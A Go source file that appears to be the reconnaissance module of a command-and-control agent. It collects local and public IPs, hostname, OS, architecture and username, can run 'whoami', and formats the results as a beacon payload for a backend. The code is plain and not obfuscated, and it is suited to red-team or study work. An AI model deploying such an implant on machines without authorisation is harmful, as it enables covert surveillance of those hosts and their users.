package system

import (
	"bytes"
	"context"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Info holds system information
type Info struct {
	LocalIP  string
	PublicIP string
	Hostname string
	OS       string
	Arch     string
	User     string
}

// GetLocalIP attempts to get the local IP address
func GetLocalIP() string {
	const cmdTimeout = 3 * time.Second
	
	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
	defer cancel()
	
	var cmd *exec.Cmd
	// Try OS-specific commands
	if _, err := exec.LookPath("ipconfig"); err == nil {
		// Windows
		cmd = exec.CommandContext(ctx, "ipconfig")
	} else if _, err := exec.LookPath("ip"); err == nil {
		// Linux
		cmd = exec.CommandContext(ctx, "ip", "addr", "show")
	} else {
		return ""
	}
	
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	
	// Parse output for IPv4 addresses (skip localhost)
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		// Windows: "IPv4 Address. . . . . . . . . . . : 192.168.1.100"
		if strings.Contains(line, "IPv4 Address") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				ip := strings.TrimSpace(parts[1])
				if !strings.HasPrefix(ip, "127.") {
					return ip
				}
			}
		}
		// Linux: "inet 192.168.1.100/24"
		if strings.HasPrefix(line, "inet ") && !strings.Contains(line, "127.0.0.1") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				ip := strings.Split(parts[1], "/")[0]
				if !strings.HasPrefix(ip, "127.") {
					return ip
				}
			}
		}
	}
	return ""
}

// GetPublicIP attempts to get the public IP address
func GetPublicIP(whoamiClient *http.Client, whoamiToken string) string {
	// Try whoami endpoint first if token is available
	if whoamiToken != "" && whoamiClient != nil {
		if ip := getPublicIPFromWhoami(whoamiClient, whoamiToken); ip != "" {
			return ip
		}
	}
	
	// Fallback to external IP services
	return getPublicIPFromServices()
}

// getPublicIPFromWhoami gets public IP from the secure whoami endpoint
func getPublicIPFromWhoami(client *http.Client, token string) string {
	req, _ := http.NewRequest("GET", "https://api.gla1v3.local/whoami", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("User-Agent", "Gla1v3-Agent/0.1 whoami")
	
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("whoami request failed: %v", err)
		return ""
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 {
		log.Printf("whoami non-200: %s", resp.Status)
		return ""
	}
	
	// Simple JSON parsing (could use json.Decoder for larger responses)
	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	body := buf.String()
	
	// Extract IP from JSON
	if strings.Contains(body, `"ip"`) {
		parts := strings.Split(body, `"ip"`)
		if len(parts) >= 2 {
			ipPart := strings.TrimPrefix(parts[1], ":")
			ipPart = strings.Trim(ipPart, ` "{}`)
			if ip := strings.TrimSpace(ipPart); ip != "" {
				log.Printf("whoami -> publicIp: %s", ip)
				return ip
			}
		}
	}
	
	return ""
}

// getPublicIPFromServices attempts to get public IP from external services
func getPublicIPFromServices() string {
	services := []string{
		"https://api.ipify.org?format=text",
		"https://icanhazip.com",
		"https://ifconfig.me/ip",
	}
	
	for _, ipService := range services {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		
		req, _ := http.NewRequestWithContext(ctx, "GET", ipService, nil)
		req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
		
		// Use default HTTP client without mTLS for public services
		plainClient := &http.Client{Timeout: 5 * time.Second}
		resp, err := plainClient.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		if resp.StatusCode != 200 {
			continue
		}
		
		var buf bytes.Buffer
		if _, err := buf.ReadFrom(resp.Body); err != nil {
			continue
		}
		
		ip := strings.TrimSpace(buf.String())
		if ip != "" && len(ip) < 50 { // sanity check
			log.Printf("External IP service -> publicIp: %s", ip)
			return ip
		}
	}
	
	return ""
}

// GetBasicInfo returns basic system information
func GetBasicInfo() Info {
	info := Info{
		OS:   runtime.GOOS,
		Arch: runtime.GOARCH,
	}
	
	// Hostname
	if hostname, err := os.Hostname(); err == nil {
		info.Hostname = hostname
	}
	
	// User
	if user := os.Getenv("USER"); user != "" {
		info.User = user
	} else if user := os.Getenv("USERNAME"); user != "" {
		info.User = user
	}
	
	return info
}

// GetWhoamiOutput runs the whoami command
func GetWhoamiOutput() (string, string) {
	const cmdTimeout = 3 * time.Second
	const maxOutput = 2048
	
	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "whoami")
	outBytes, err := cmd.Output()
	
	output := ""
	errStr := ""
	
	if err != nil {
		// include stderr if possible
		if ee, ok := err.(*exec.ExitError); ok {
			errStr = strings.TrimSpace(string(ee.Stderr))
		} else {
			errStr = err.Error()
		}
		log.Printf("whoami failed: %v", err)
	}
	
	if len(outBytes) > 0 {
		output = strings.TrimSpace(string(outBytes))
		if len(output) > maxOutput {
			output = output[:maxOutput] + "...(truncated)"
		}
	}
	
	return output, errStr
}

// CollectInfo collects comprehensive system information
func CollectInfo(whoamiClient *http.Client, whoamiToken string) Info {
	info := GetBasicInfo()
	info.LocalIP = GetLocalIP()
	info.PublicIP = GetPublicIP(whoamiClient, whoamiToken)
	return info
}

// FormatForBeacon formats system info for beacon payload
func (i Info) FormatForBeacon() map[string]interface{} {
	payload := make(map[string]interface{})
	
	// Send both public and local IPs (backend expects these field names)
	if i.PublicIP != "" {
		payload["publicIp"] = i.PublicIP
	}
	
	if i.LocalIP != "" {
		payload["localIp"] = i.LocalIP
	}
	
	if i.Hostname != "" {
		payload["hostname"] = i.Hostname
	}
	
	if i.OS != "" {
		payload["os"] = i.OS
	}
	
	if i.Arch != "" {
		payload["arch"] = i.Arch
	}
	
	if i.User != "" {
		payload["user"] = i.User
	}
	
	return payload
}

// PrintInfo logs system information
func (i Info) PrintInfo() {
	log.Printf("System Info - Host: %s, OS: %s/%s, User: %s", 
		i.Hostname, i.OS, i.Arch, i.User)
	if i.LocalIP != "" {
		log.Printf("Local IP: %s", i.LocalIP)
	}
	if i.PublicIP != "" {
		log.Printf("Public IP: %s", i.PublicIP)
	}
}
